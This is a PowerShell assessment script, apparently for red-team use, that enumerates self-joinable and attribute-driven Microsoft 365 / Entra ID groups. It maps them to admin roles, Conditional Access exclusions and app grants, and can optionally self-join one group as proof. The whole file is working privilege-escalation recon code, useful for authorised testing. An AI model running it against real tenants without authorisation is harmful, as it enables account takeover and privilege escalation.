<#
.SYNOPSIS
    Microsoft Auto Approved DL Account Takeover (MAADAT) Recon (delegated / assumed-breach vantage).

.DESCRIPTION
    Run as a low-privileged ("breached") user. Enumerates groups the account can
    self-join without owner approval and correlates each to privilege (role-assignable,
    active/PIM-eligible directory roles, Conditional Access include/exclude, app-role
    grants), plus flags dynamic groups whose membership rule keys on user-mutable
    attributes. READ-ONLY by default.

    Use -ProveJoin <group> to empirically prove exploitability by actually self-adding
    to ONE specified group; pair with -RevertAfter to remove yourself again. Mutation is
    OFF unless -ProveJoin is supplied, and every change is logged.

    No client/tenant identifiers are embedded - everything is parameterized.

.PARAMETER ProveJoin
    objectId or identity of ONE group to actually self-join (proves the finding).

.PARAMETER RevertAfter
    After a successful -ProveJoin, remove yourself from the group again.

.EXAMPLE
    .\Invoke-SelfServiceJoinRecon.ps1 -UserPrincipalName user@contoso.onmicrosoft.com
    .\Invoke-SelfServiceJoinRecon.ps1 -ProveJoin <groupId> -RevertAfter
#>
[CmdletBinding(DefaultParameterSetName = 'Enumerate', SupportsShouldProcess, ConfirmImpact = 'High')]
param(
    [string]$TenantId,
    [string]$UserPrincipalName,
    [string]$OutputPath = (Join-Path (Get-Location) ("SelfServiceJoinRecon_{0}.json" -f (Get-Date -Format 'yyyyMMdd_HHmmss'))),
    [switch]$SkipExchange,
    [switch]$IncludeBloodHoundIds,
    [Parameter(ParameterSetName = 'Prove')][string]$ProveJoin,
    [Parameter(ParameterSetName = 'Prove')][switch]$RevertAfter
)

$ErrorActionPreference = 'Stop'

# Attributes a standard user (or a guest in their home tenant) can typically self-edit.
# A dynamic rule keyed on any of these is a candidate escalation vector.
$UserMutableAttributes = @(
    'department', 'jobTitle', 'city', 'state', 'country', 'otherMails', 'displayName',
    'givenName', 'surname', 'mobilePhone', 'streetAddress', 'preferredLanguage', 'faxNumber'
) + (1..15 | ForEach-Object { "extensionAttribute$_" })

function Write-Log {
    param([string]$Message, [ValidateSet('INFO', 'WARN', 'ACTION', 'RESULT')] [string]$Level = 'INFO')
    $color = @{ INFO = 'Gray'; WARN = 'Yellow'; ACTION = 'Magenta'; RESULT = 'Cyan' }[$Level]
    Write-Host ("[{0}] {1}" -f $Level, $Message) -ForegroundColor $color
}

function Invoke-GraphGetAll {
    # Paginated GET with 429 retry. $Eventual adds advanced-query headers.
    param([string]$Uri, [switch]$Eventual)
    $headers = @{}
    if ($Eventual) { $headers['ConsistencyLevel'] = 'eventual' }
    $items = [System.Collections.Generic.List[object]]::new()
    $next = $Uri
    while ($next) {
        try {
            $resp = Invoke-MgGraphRequest -Method GET -Uri $next -Headers $headers
        }
        catch {
            if ($_.Exception.Message -match '429') {
                Start-Sleep -Seconds 3
                $resp = Invoke-MgGraphRequest -Method GET -Uri $next -Headers $headers
            }
            else { throw }
        }
        if ($resp.value) { $resp.value | ForEach-Object { $items.Add($_) } }
        elseif ($resp -and -not $resp.PSObject.Properties['value']) { $items.Add($resp) }
        $next = $resp.'@odata.nextLink'
    }
    return $items
}

function Test-DynamicRuleExploitable {
    param([string]$Rule)
    if ([string]::IsNullOrWhiteSpace($Rule)) { return $null }
    $hits = $UserMutableAttributes | Where-Object { $Rule -match "user\.$([regex]::Escape($_))\b" }
    if (-not $hits) { return $null }
    $guestExcluded = $Rule -match 'user\.userType\s*-ne\s*"Guest"'
    return [PSCustomObject]@{
        MutableAttributes = @($hits)
        GuestExcluded     = [bool]$guestExcluded
    }
}

function Get-RiskTier {
    param([pscustomobject]$Group)
    $p = $Group.Privilege
    if ($p.HasRoleAssigned -or $p.HasEligibleRole -or $p.CAExcludeGroup) { return 'Critical' }
    if ($Group.IsRoleAssignable -or $p.CAIncludeGroup -or $p.AppRoleGrants -or
        ($Group.DynamicExploitable -and -not $Group.DynamicExploitable.GuestExcluded)) { return 'High' }
    if ($Group.MailEnabled) { return 'Medium' }   # possible shared-identity / inbox-exposure vector
    return 'Low'
}

# ---- Connect ---------------------------------------------------------------
$readScopes = @('Group.Read.All', 'Directory.Read.All', 'Policy.Read.All',
    'RoleManagement.Read.Directory', 'Application.Read.All', 'User.Read')
$scopes = $readScopes
if ($PSCmdlet.ParameterSetName -eq 'Prove') { $scopes += 'GroupMember.ReadWrite.All' }

$connect = @{ Scopes = $scopes }
if ($TenantId) { $connect['TenantId'] = $TenantId }
Write-Log "Connecting to Microsoft Graph (delegated) with scopes: $($scopes -join ', ')"
Connect-MgGraph @connect | Out-Null

$me = Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName'
$meId = $me.id
Write-Log "Acting as: $($me.userPrincipalName) ($meId)"

if (-not $SkipExchange) {
    try {
        $exoConnect = @{ ShowBanner = $false }
        if ($UserPrincipalName) { $exoConnect['UserPrincipalName'] = $UserPrincipalName }
        Connect-ExchangeOnline @exoConnect
    }
    catch {
        Write-Log "Exchange Online connect failed ($($_.Exception.Message)). DL enumeration skipped - use the app-only inspector for DLs." 'WARN'
        $SkipExchange = $true
    }
}

# ---- Fetch tenant context once ---------------------------------------------
Write-Log "Enumerating Conditional Access policies..."
$caPolicies = @()
try {
    $caPolicies = Invoke-GraphGetAll -Uri ('https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies' +
        '?$select=id,displayName,state,conditions,grantControls')
}
catch { Write-Log "CA policy read denied ($($_.Exception.Message)) - CA correlation unavailable." 'WARN' }

function Get-CALinkage {
    param([string]$GroupId)
    $inc = @(); $exc = @()
    foreach ($pol in $caPolicies) {
        $u = $pol.conditions.users
        if ($u.includeGroups -contains $GroupId) { $inc += $pol.displayName }
        if ($u.excludeGroups -contains $GroupId) { $exc += $pol.displayName }
    }
    [PSCustomObject]@{ Include = $inc; Exclude = $exc }
}

function Get-GroupPrivilege {
    param([string]$GroupId)
    $roleAssigned = @(); $roleEligible = @(); $appRoles = @()
    try {
        $ra = Invoke-GraphGetAll -Uri ("https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=principalId eq '$GroupId'&`$expand=roleDefinition")
        $roleAssigned = @($ra | ForEach-Object { $_.roleDefinition.displayName })
    }
    catch {}
    try {
        $re = Invoke-GraphGetAll -Uri ("https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?`$filter=principalId eq '$GroupId'&`$expand=roleDefinition")
        $roleEligible = @($re | ForEach-Object { $_.roleDefinition.displayName })
    }
    catch {}
    try {
        $ar = Invoke-GraphGetAll -Uri "https://graph.microsoft.com/v1.0/groups/$GroupId/appRoleAssignments"
        $appRoles = @($ar | ForEach-Object { $_.resourceDisplayName })
    }
    catch {}
    $ca = Get-CALinkage -GroupId $GroupId
    [PSCustomObject]@{
        HasRoleAssigned = [bool]$roleAssigned.Count
        RolesAssigned   = $roleAssigned
        HasEligibleRole = [bool]$roleEligible.Count
        RolesEligible   = $roleEligible
        AppRoleGrants   = $appRoles
        CAIncludeGroup  = [bool]$ca.Include.Count
        CAExcludeGroup  = [bool]$ca.Exclude.Count
        CAIncludes      = $ca.Include
        CAExcludes      = $ca.Exclude
    }
}

# ---- M365 (Unified) groups: Public = self-join, no approval ----------------
Write-Log "Enumerating groups via Graph..."
$allGroups = Invoke-GraphGetAll -Eventual -Uri ('https://graph.microsoft.com/v1.0/groups?$count=true&$select=' +
    'id,displayName,visibility,mail,mailEnabled,securityEnabled,isAssignableToRole,groupTypes,membershipRule,assignedLicenses')

$results = [System.Collections.Generic.List[object]]::new()

foreach ($g in $allGroups) {
    $isUnified = $g.groupTypes -contains 'Unified'
    $isDynamic = $g.groupTypes -contains 'DynamicMembership'
    $publicJoin = $isUnified -and ($g.visibility -eq 'Public')
    $dynExploit = if ($isDynamic) { Test-DynamicRuleExploitable -Rule $g.membershipRule } else { $null }

    # Include a group if it is self-joinable (public M365) OR a dynamic group with an exploitable rule.
    if (-not ($publicJoin -or $dynExploit)) { continue }

    $row = [PSCustomObject]@{
        DisplayName        = $g.displayName
        ObjectId           = $g.id
        JoinVector         = if ($publicJoin) { 'Public M365 group (self-join, no approval)' } else { 'Dynamic membership (attribute-driven)' }
        Mail               = $g.mail
        MailEnabled        = [bool]$g.mailEnabled
        IsRoleAssignable   = [bool]$g.isAssignableToRole
        IsDynamic          = $isDynamic
        DynamicExploitable = $dynExploit
        HasLicenses        = [bool]($g.assignedLicenses.Count)
        Privilege          = Get-GroupPrivilege -GroupId $g.id
        RiskTier           = $null
    }
    $row.RiskTier = Get-RiskTier -Group $row
    $results.Add($row)
}

# ---- Open distribution / mail-enabled security groups ----------------------
if (-not $SkipExchange) {
    Write-Log "Enumerating distribution groups via Exchange Online..."
    try {
        $openDLs = Get-DistributionGroup -ResultSize Unlimited |
        Where-Object { $_.MemberJoinRestriction -in 'Open', 'ApprovalRequired' }
        foreach ($dl in $openDLs) {
            $gid = $dl.ExternalDirectoryObjectId
            $priv = if ($gid) { Get-GroupPrivilege -GroupId $gid } else {
                [PSCustomObject]@{ HasRoleAssigned = $false; RolesAssigned = @(); HasEligibleRole = $false; RolesEligible = @(); AppRoleGrants = @(); CAIncludeGroup = $false; CAExcludeGroup = $false; CAIncludes = @(); CAExcludes = @() }
            }
            $row = [PSCustomObject]@{
                DisplayName        = $dl.DisplayName
                ObjectId           = $gid
                JoinVector         = "Distribution/MESG (MemberJoinRestriction = $($dl.MemberJoinRestriction))"
                Mail               = $dl.PrimarySmtpAddress
                MailEnabled        = $true
                IsRoleAssignable   = $false
                IsDynamic          = $false
                DynamicExploitable = $null
                HasLicenses        = $false
                Privilege          = $priv
                RiskTier           = $null
            }
            $row.RiskTier = Get-RiskTier -Group $row
            $results.Add($row)
        }
    }
    catch { Write-Log "Get-DistributionGroup failed/limited ($($_.Exception.Message)) - likely insufficient EXO RBAC for this user." 'WARN' }
}

# ---- Report ----------------------------------------------------------------
$tierOrder = @{ Critical = 0; High = 1; Medium = 2; Low = 3 }
$sorted = $results | Sort-Object @{ E = { $tierOrder[$_.RiskTier] } }, DisplayName

Write-Log ("Self-joinable / exploitable groups found: {0}" -f $sorted.Count) 'RESULT'
$sorted | Format-Table -AutoSize DisplayName, RiskTier, JoinVector,
@{ N = 'Roles'; E = { ($_.Privilege.RolesAssigned + $_.Privilege.RolesEligible) -join ',' } },
@{ N = 'CA'; E = { if ($_.Privilege.CAExcludeGroup) { 'EXCLUDE' } elseif ($_.Privilege.CAIncludeGroup) { 'include' } else { '' } } }

$sorted | ConvertTo-Json -Depth 6 | Out-File -FilePath $OutputPath -Encoding utf8
Write-Log "Full results written to: $OutputPath" 'RESULT'

if ($IncludeBloodHoundIds) {
    $bhPath = [IO.Path]::ChangeExtension($OutputPath, 'bloodhound.txt')
    $sorted | Where-Object { $_.RiskTier -in 'Critical', 'High' -and $_.ObjectId } |
    Select-Object -ExpandProperty ObjectId | Out-File $bhPath -Encoding utf8
    Write-Log "High-value group objectIds (for AzureHound/BloodHound pivoting): $bhPath" 'RESULT'
}

# ---- Optional: prove exploitability ----------------------------------------
if ($PSCmdlet.ParameterSetName -eq 'Prove') {
    $target = $sorted | Where-Object { $_.ObjectId -eq $ProveJoin -or $_.DisplayName -eq $ProveJoin } | Select-Object -First 1
    if (-not $target) { throw "ProveJoin target '$ProveJoin' not found among enumerated self-joinable groups." }

    Write-Log "PROOF-OF-CONCEPT self-join target: $($target.DisplayName) [$($target.RiskTier)] via $($target.JoinVector)" 'ACTION'
    if ($PSCmdlet.ShouldProcess($target.DisplayName, "Self-join group (MUTATING action against the tenant)")) {

        if ($target.JoinVector -like 'Distribution/MESG*') {
            Add-DistributionGroupMember -Identity $target.ObjectId -Member $meId -Confirm:$false
            Write-Log "Self-added to distribution group $($target.DisplayName)." 'RESULT'
            if ($RevertAfter) {
                Remove-DistributionGroupMember -Identity $target.ObjectId -Member $meId -Confirm:$false
                Write-Log "Reverted: removed self from $($target.DisplayName)." 'RESULT'
            }
        }
        else {
            $body = @{ '@odata.id' = "https://graph.microsoft.com/v1.0/directoryObjects/$meId" }
            $refUri = 'https://graph.microsoft.com/v1.0/groups/' + $target.ObjectId + '/members/$ref'
            Invoke-MgGraphRequest -Method POST -Uri $refUri -Body $body
            Write-Log "Self-added to M365 group $($target.DisplayName)." 'RESULT'
            if ($RevertAfter) {
                $delUri = 'https://graph.microsoft.com/v1.0/groups/' + $target.ObjectId + '/members/' + $meId + '/$ref'
                Invoke-MgGraphRequest -Method DELETE -Uri $delUri
                Write-Log "Reverted: removed self from $($target.DisplayName)." 'RESULT'
            }
        }
    }
}
